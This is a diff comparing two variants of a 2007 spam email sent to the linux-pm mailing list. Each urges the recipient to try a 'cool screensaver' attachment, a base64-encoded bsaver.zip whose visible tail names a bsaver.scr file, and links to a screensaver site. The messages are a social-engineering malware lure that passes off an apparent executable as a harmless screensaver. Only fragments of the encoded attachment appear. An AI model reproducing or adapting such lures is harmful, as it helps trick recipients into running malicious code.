@@ -1,10 +1,10 @@
-From: "Danielle Arellano" <fishel.dadisman@active24.fr>
-Subject: Wanna be slim?
-Date: Fri, 27 Jul 2007 02:49:50 -0900
-Message-ID: <01c7cff8$cd377030$7af261d2@fishel.dadisman>
+From: "Ismael Travis" <marcelo.dadisman@ariadne.at>
+Subject: Encounter The Ultimate
+Date: Fri, 27 Jul 2007 02:49:47 -0900
+Message-ID: <01c7cff8$cb478710$7af261d2@marcelo.dadisman>
 Mime-Version: 1.0
 Content-Type: multipart/mixed;
-	boundary="----=_NextPart_000_0006_01C7D044.3D1F1830"
+	boundary="----=_NextPart_000_0006_01C7D044.3B2F2F10"
 Return-path: <linux-pm-bounces@lists.linux-foundation.org>
 List-Unsubscribe: <https://lists.linux-foundation.org/mailman/listinfo/linux-pm>,
 	<mailto:linux-pm-request@lists.linux-foundation.org?subject=unsubscribe>
@@ -15,25 +15,25 @@ List-Subscribe: <https://lists.linux-foundation.org/mailman/listinfo/linux-pm>,
 	<mailto:linux-pm-request@lists.linux-foundation.org?subject=subscribe>
 Sender: linux-pm-bounces@lists.linux-foundation.org
 Errors-To: linux-pm-bounces@lists.linux-foundation.org
-To: linux-pm@lists.osdl.org
+To: linux-pm@osdl.org
 List-Id: linux-pm@vger.kernel.org
 
 This is a multi-part message in MIME format.
 
-------=_NextPart_000_0006_01C7D044.3D1F1830
+------=_NextPart_000_0006_01C7D044.3B2F2F10
 Content-Type: text/plain;
 	charset="iso-8859-2"
 Content-Transfer-Encoding: 7bit
 
-Good morning, dear Friend!
+Good morning, buddy!
 
 Cool screensaver in your attachment!
 
-Wanna more? Welcome to our site -  http://dreamhoster[dot]net/screensavers/
+Try it! Do you like it? Welcome to our site -  http://dreamhoster[dot]net/screensavers/
 
-Thanks.
+Regards.
 
-------=_NextPart_000_0006_01C7D044.3D1F1830
+------=_NextPart_000_0006_01C7D044.3B2F2F10
 Content-Type: application/zip;
 	name="bsaver.zip"
 Content-Transfer-Encoding: base64
@@ -381,11 +381,11 @@ IxXx/br4FoU9HGmMYpA9LBTia8EmCGNTfgqU+fAKyCZa2ZEQfcTWMiMNiO1QKKtVdGz4w8xtd29N
 fcs0ZPz/q/xfUEsBAhQAFAAAAAgAJw/7NhOgCqEjSwAAAFIAAAoAAAAAAAAAAAAgAAAAAAAAAGJz
 YXZlci5zY3JQSwUGAAAAAAEAAQA4AAAAS0sAAAAA 
 
-------=_NextPart_000_0006_01C7D044.3D1F1830
+------=_NextPart_000_0006_01C7D044.3B2F2F10
 Content-Type: text/plain; charset="us-ascii"
 MIME-Version: 1.0
 Content-Transfer-Encoding: 7bit
 Content-Disposition: inline
 
 
-------=_NextPart_000_0006_01C7D044.3D1F1830--
+------=_NextPart_000_0006_01C7D044.3B2F2F10--
